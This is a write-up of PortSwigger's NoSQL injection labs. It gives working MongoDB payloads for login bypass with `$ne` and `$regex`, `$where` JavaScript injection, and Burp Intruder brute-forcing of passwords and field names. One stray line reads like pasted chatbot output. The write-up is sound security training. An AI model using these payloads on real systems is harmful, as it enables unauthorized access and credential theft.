# NoSQL injection [PortSwigger Academy]

<sup>This write-up covers the NoSQL injection section of Web Security Academy by PortSwigger.</sup>

## Types of NoSQL injection

NoSQL injection vulnerabilities generally fall into two categories: __syntax injection__, where the attacker breaks the structure of a NoSQL query to insert arbitrary input --- similar in concept to SQL injection but adapted to the diverse query languages and data formats used in NoSQL systems; and __operator injection__, where malicious input leverages NoSQL query operators to alter query logic. This topic outlines how to identify NoSQL vulnerabilities broadly, with a specific focus on exploiting them in MongoDB, the most widely used NoSQL database, and includes hands-on labs for practical experience. 

## NoSQL syntax injection

NoSQL injection vulnerabilities can often be identified by trying to disrupt the query syntax. This involves methodically testing each input field using special characters or fuzzing strings to see if they cause database errors or unexpected behavior, which would indicate insufficient input sanitization. If you're aware of the target database's query language, tailor your fuzzing accordingly with language-specific payloads. If not, use a broad set of fuzz strings to cover different possible NoSQL query syntaxes. 

### Detecting syntax injection in MongoDB

Imagine a shopping app that displays items by category. When a user selects the "Fizzy drinks" category, their browser sends a request like:

```
https://insecure-website.com/product/lookup?category=fizzy
```

The app then queries its MongoDB database using a condition like:

```mongodb
this.category == 'fizzy'
```

To test for potential NoSQL injection, you can try injecting a fuzz string into the `category` parameter. For MongoDB, an example fuzz string might be:

```
'"`{\r;$Foo}\n$Foo \xYZ
```

You would URL-encode this string and send it in a request like:

```
https://insecure-website.com/product/lookup?category=%27%22%60%7B%0D%0A%3B%24Foo%7D%0A%24Foo%20%5CXyz%00
```

If the response differs from the usual behavior, this might signal that the application fails to properly sanitize user input. 

> NOTE: NoSQL injection vulnerabilities can appear in different formats depending on how input is handled. In this case, input is passed via the URL, so the fuzz string is URL-encoded. But if the input were submitted as JSON, you'd need to format it differently, like:
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

Adapt your testing approach based on how and where the application processes input. 

### Determining which characters are procesed

To find out which characters the application treats as part of its query syntax, you can test by injecting individual characters. For instance, submitting a single `'` might result in a MongoDB query like:

```mongodb
this.category == '''
```

If this alters the usual response, it could indicate that the `'` character disrupted the query, leading to a syntax error. To verify this, you can try submitting a properly escaped version of the input such as:

```mongodb
this.category == '\''
```

If this input is accepted without errors, it suggests that the application might not be properly sanitizing inputs and could be susceptible to injection attacks. 

### Confirming conditional behavior

Once you've identified a vulnerability, the next step is to check whether you can manipulate boolean conditions using NoSQL syntax.

To do this, send two requests --- one with a condition that evaluates to false and another that evaluates to true. For example, you could use `' && 0 && 'x` for false and `' && 1 &&'x` for true, like so:

- `https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`
- `https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x`

If the application's behavior changes between these two requests, it suggests that the injected boolean logic is affecting the server-side query --- confirming that the input is influencing query execution. 

### Overriding existing conditions

Once you've confirmed that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For instance, you can inject a JavaScript condition that always evaluates to true, such as `' || '1' == '1'`. This would result in a URL like:

```
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

This would modify the MongoDB query to:

```mongodb
this.category == 'fizzy'||'1'=='1'
```

Since the injected condition is always true, the query will return all items, allowing you to view all products, including those in hidden or unknown categories.

> NOTE: Be cautious when injecting conditions that always evaluate to true into NoSQL queries. While it may seem harmless in the context of viewing data, applications often reuse request data in multiple queries. If it's used for operations like updating or deleting data, it could inadvertently lead to data loss. 

### Overriding existing conditions - Continued

You can also append a null character to the category value, as MongoDB may ignore any characters following a null character. This would cause the query to disregard any additional conditions. For example, if the query includes a restriction like: 

```mongodb
this.category == 'fizzy' && this.released = 1
```

The condition `this.released == 1` is intended to filter products that are released, excluding unreleased ones where `this.released == 0`.

An attacker could exploit this by crafting a URL such as:

```
https://insecure-website.com/product/lookup?category=fizzy'%00
```

This results in the following NoSQL query:

```mongodb
this.category == 'fizzy'\u0000' && this.released == 1
```

If MongoDB ignores everything after the null character, the `this.released == 1` condition is bypassed, allowing all products in the `fizzy` category, including unreleased ones, to be desplayed. 

### Lab: Detecting NoSQL injection

In Burp's browser access the lab and try any category under the product filter. Go to __Proxy__ > __HTTP history__ and right-click the category filter request `GET /filter?category=...` and select "Send to Repeater". 

if you submit `Lifestyle'` as value to `category=` parameter in the query and Send the request, a JavaScript error is returned:

```html
<p class=is-warning>
Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}
</p>
```

This indicates that the user input was not filtered or sanitized correctly. Submit a valid JavaScript payload in the value of the `category` query parameter:

```
GET /filter?category=Lifestyle'+' HTTP/2
```

And make sure to URL-encode the payload before sending the request (`Lifestyle'%2b'`). Notice that it doesn't cause the same error from above. This indicates that a form of server-side injection may be occurring. 

Identify whether you can inject boolean conditions to change the response. Insert a false condition in the category parameter, a URL-encoded equivalent of this: `Lifestyle' && 0 && 'x` would be `Lifestyle'+%26%26+0+%26%26+'x`. Notice that no products are retrieved. Now try the true condition, or a URL-encode equivalent of `Lifestyle' && 1 && 'x`. Notice that the products in the __Lifestyle__ category are retrieved.

Submit a boolean condition that always evaluates to true in the category parameter: `Lifestyle'||1||'`. Notice that the response contains products you couldn't otherwise find just browsing the site. 

Right-click the respose and select __Show respones in browser__, copy the URL and paste it in the browser. This solves the lab. 

> NOTE: Check out [walkthrough](nosql_lab01_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## NoSQL operator injection

NoSQL databases commonly support query operators that define conditions for selecting data. In MongoDB, examples include:

- `$where`: selects documents matching a JavaScript expression
- `$ne`: matches values not equal to a given value.
- `$in`: matches any value from a specified array.
- `$regex`: filters documents based on a regular expression.

You might be able to exploit NoSQL queries by injecting these operators. To identify such vulnerabilities, try submitting various query operators through user inputs and observe whether the application's behavior or error messages change. 

### Submitting query operators

In JSON-based requests, you can inject query operators by nesting them within objects. For instance, a typical input like `{"username":"wiener"}` can be altered to `{"username":{"$ne":"invalid"}}` to manipulate the query logic. 

For requests using URL parameters, operators can be injected by formatting them like `username[$ne]=invalid`. If this approach fails, you can try:

- Switching the request method from GET to POST
- Setting the `Content-Type` header to `application/json`
- Placing the data in the request body as JSON
- Injecting operators directly into the JSON structure

> NOTE: Tools like the Content Type Converter extension can help automate converting form-based requests to JSON format.

### Detecting operator injection in MongoDB

Imagine an application that processes login credentials from a POST request like this: 

```
{"username":"wiener","password":"peter"}
```

To test for NoSQL injection, you can try replacing the input values with query operators. For instance, to check if the `username` field handles operators, try:

```
{"username":{"$ne":"invalid"},"password":"peter"}
```

If the operator is effective the database will match any username that isn't "invalid".

If both `username` and `password` fields process injected operators, you may bypass login with:

```
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

This would authenticate you as the first user in the database since both fields match any non-"invalid" values.

To aim for a specific account, inject a known or guessed username an a permissive password condition:

```
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

This attempts to log in as a high-privilege user whose password isn't empty.

### Lab: Exploiting NoSQL operator injection to bypass authentication

In Burp's browser, log in to the application as `wiener:peter` and in __Proxy__ > __HTTP history__ find `POST /login` request, with body:

```json
{
  "username":"wiener",
  "password":"peter"
}
```

Right-click the request and select "Send to Repeater". In repeater, change the `username` parameter from `"wiener"` to `{"$ne":""}`, then send the request. Notice that this enables you to log in:

```
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: session=YOUR-SESSION-ID; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Change the value of the `username` parameter again to `{"$regex":"wien.*"}` and send the request. Notice, that you can also log in when using the `$regex` operator. 

Now set both `username` and `password` parameters to `{"$ne":""}` and send the request again. Notice that this causes the query to return an unexpected number of records:

```html
<h4>Internal Server Error</h4>
<p class=is-warning>Query returned unexpected number of records</p>
```

This indicates that more than one user has been selected.

Change the value of `username` parameter to `{"$regex":"admin.*"},` and send the request again. Notice, that this successfully logs you in as admin user:

```
HTTP/2 302 Found
Location: /my-account?id=admin6fn8crcu
```

Right-click the response and select "Request in Browser" > "In current browser session". Copy URL and paste it into the new browser tab. Click "Repeat the request" and solve the lab. 

> NOTE: Check out [walkthrough](nosql_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy

## Exploiting syntax injectin to extract data

Many NoSQL databases, like MongoDB, support limited JavaScript execution through features such as the `$where` operator or the `mapReduce()` function. If an application is vulnerable and utilizes these features, the database might evaluate injected JavaScript to extract sensitive data from the database.

### Exfiltrating data in MongoDB

Imagine an insecure application that lets users look up other usernames and displays their roles. When a user searches for "admin", it sends a request like this:

```
https://insecure-website.com/user/lookup?username=admin
```

This triggers a NoSQL query using the `$where` operator, such as:

```json
{ "$where": "this.username == 'admin'" }
```

Because `$where` executes JavaScript, you can try injecting JavaScript code to access sensitive data. For instance, sending:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

would modify the query and help you check if the first character of the admin's password is "a". By doing this iteratively, you could extract the password one character at a time. You can also use JavaScript functions like `match()` to test patterns. For example:

```
admin' && this.password.match(/\d/) || 'a'=='b
```

would tell you whether the password includes any digits.

### Identifying field names

Since MongoDB supports semi-structired data without a strict schema, you may first need to identify which fields exist in a collection before extracting data via JavaScript injection.

To check if a field like `password` exists, you can inject a payload such as:

```
https://insecure-website.com/user/lookup?username=admin' && this.password!='
```

Then, compare the server's response to similar requests using a known valid field and a likely invalid one:

- For a known field: `admin' && this.username!='`
- For a likely non-existent field: `admin' && this.foo!='`

If the response to the `password` payload resembles that of the known field (`username`) and differs from the invalid one (`foo`), it's a good sign that the `password` field exists in the database. 

### Identifying field names - Continued

To discover different field names, you can try a dictionary attack by cycling through a wordlist of possible field names.

> NOTE: Alternatively, you can extract field names one character at a time using NoSQL operator injection. This method avoids relying on guesses or precompiled lists.

### Lab: Exploiting NoSQL injection to extract data

In Burp's browser, log in as `wiener:peter` and in Proxy history find a `GET /user/lookup?user=wiener` request with response body:

```
{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```

Right-click it and Send to Repeater. Add `'` character to the query and click Send. Notice, that this causes an error:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 58

{
  "message": "There was an error getting user details"
}
```

This might indicate that the user input was not filtered or sanitized correctly. Submit a valid JavaScript payload in the user parameter. For example, use URL-encoded `wiener'+'`: `wiener'%2b'` and send the request:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 81

{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```

As you can see the request went through normally and retrieved user information, which indicates that a form of server-side injection may be occurring.

Identify whether you can inject boolean conditions to change the response. Submit a false condition as `user` query parameter, a URL-encoded `wiener' && '1'=='2`: `wiener'+%26%26+'1'%3d%3d'2` and send the request:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 38

{
  "message": "Could not find user"
}
```

Now submit a true condition, simply change `2` to `1` in the previous payload and send the request:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 81

{
  "username": "wiener",
  "email": "wiener@normal-user.net",
  "role": "user"
}
```

This demonstrates that you can trigger different responses for true and false conditions. Now identify the password length, change the user parameter to `administrator` and add the following condition `&& this.password.length < 30 || 'a'=='b`, URL-encode the entire query and send the request:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 96

{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```

This indicates that the condition is true, because the password is less than 30 characters. Now if we keep trying lower and lower numbers instead of 30, eventually we'll get to 8, which will return:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 38

{
  "message": "Could not find user"
}
```

So this means, there are 8 characters (`<9`) in the password. Now we are going to brute force this password using Burp's __Intruder__. Right-click the request and select "Send to Intruder". Enter this string as query value: `administrator' && this.password[§0§]=='§a§`
and URL encode it. 

In the Payloads side panel, select position 1 from the Payload position drop-down list. Add numbers from 0 to 7 for each character of the password. Select position 2 from the Payload position drop-down list, then add lowercase letters from a to z. Click __start attack__.

Sort by _Payload 1_ lowest to highest and then _Length_ highest to lowest. Eventually, you'll get a correct character for each Payload 1 position (0-7) out of which you can assemble a password. Log in as `administrator` with that password to solve the lab.

> NOTE: Check out [walkthrough](nosql_lab03_zaproxy.md) of this lab's __brute-force section__ in OWASP Zed Attack Proxy 

## Exploiting NoSQL operator injection to extract data

Even if the application's original query doesn't include operators that allow arbitrary JavaScript execution, you might still be able to inject such an operator yourself. By using boolean conditions, you can test whether the application runs any JavaScript you include through the injected operator.

### Injecting operators in MongoDB

Suppose a vulnerable application accepts a username and password in a `POST` request body like this:

```json
{"username":"wiener","password":"peter"}
```

To check for operator injection, you can try adding the `$where` operator and sending two versions --- one where the condition is false and another where it's true:

```json
{"username":"wiener","password":"peter","$where":"0"}
```

And

```json
{"username":"wiener","password":"peter","$where":"1"}
```

If the server responds differently to each request, it suggests that the JavaScript code in the `$where` clause is being executed.

### Extracting field names

If you've successfully injected an operator that allows JavaScript execution, you can potentially use the `keys()` method to reveal field names. For instance, using a payload like:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

This checks whether the first character of the first field name matches `a`. This technique lets you gradually uncover the full name of a field one character at a time. 

### Exfiltrating data using operators

Another way to extract information is by using query operators that don't allow arbitrary JavaScript execution --- such as `$regex`. This operator can still be exploited to reveal data one character at a time. 

For example, in a vulnerable application that accepts a JSON `POST` request like:

```json
{"username":"myuser","password":"mypass"}
```

You might test whether `$regex` is interpreted by submitting:

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

If the server responds differently compared to a clearly incorrect password, it suggests the regex is being evaluated, meaning the input is vulnerable. 

From there, you can test character-by-character matches. For instance, this payload checks if the admin's password starts with the letter `a`:

```json
{"username":"admin","password":{"$regex":"^a*"}}
```

By adjusting the regex patterns incrementally, you can enumerate the password or other sensitive fields. Would you like help building a loop to automate this extraction?

### Lab: Exploiting NoSQL operator injection to extract unknown fields

In Burp's browser, try to log in as `carlos:invalid`. In Proxy history, you can see `POST /login` request with body:

```json
{"username":"carlos","password":"invalid"}
```

Send it to __Repeater__. As a value to `"password"` parameter, add `{"$ne":"invalid"}` instead of `"invalid"` and send the request with the following body:

```json
{"username":"carlos","password":{"$ne":"invalid"}}
```

You should receive the following message in the response:

```html
<p class=is-warning>Account locked: please reset your password</p>
```

This response indicates that `$ne` operator has been accepted and the application is vulnerable.

In Burp's browser, click "Forgot password?", enter `carlos` and submit to reset password. When you submit the `carlos` username, observe that the reset mechanism involves email verification, so you can't reset the account yourself. 

Back in Repeater test the `POST /login` request for a JavaScript injection. put a comma after `"password"` parameter value in the request body and add a new parameter: `"$where": "0"` and send the request with the following body:

```json
{"username":"carlos","password":{"$ne":"invalid"},"$where": "0"}
```

Response should have the following message:

```html
<p class=is-warning>Invalid username or password</p>
```

Change `"$where"` value from `"0"` to `"1"` and resend the request. 

It's this again:

```html
<p class=is-warning>Account locked: please reset your password</p>
```

This means that the JavaScript in the `$where` clause is being evaluated (on account of `"0"` and `"1"` returning different responses. 

Right-click this request and send it to __Intruder__. Update the `$where` parameter as follows: `"$where":"Object.keys(this)[1].match('^.{}.*')"`. Select __Cluster bomb attack__ from the drop-down menu and add payloads in the following places: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`.

In the Payloads side panel, select position 1 from the Payload position drop-down list, then set the Payload type to Numbers. Set the number range, for example from 0 to 20. Select position 2 from the Payload position drop-down list and make sure the Payload type is set to Simple list. Add all numbers, lower-case letters and upper-case letters as payloads.

For the first parameter, the __Intruder__ spelt out `username`. Now let's rerun this attack with this query: `"$where":"Object.keys(this)[2].match('^.{§§}§§.*')"`--

> OKAY. There's no way I'm waiting this long for this thing to complete. Community edition's __Intruder__ is basically garbage. 
> Check out [walkthrough](nosql_lab04_zaproxy.md) of __brute-force to identify all fields on the user object__ using OWASP Zed Attack Proxy's Fuzzer (and no __Cluster Bomb__ and other fancy names either, just a good old Fuzzer with three simultaneous payloads).
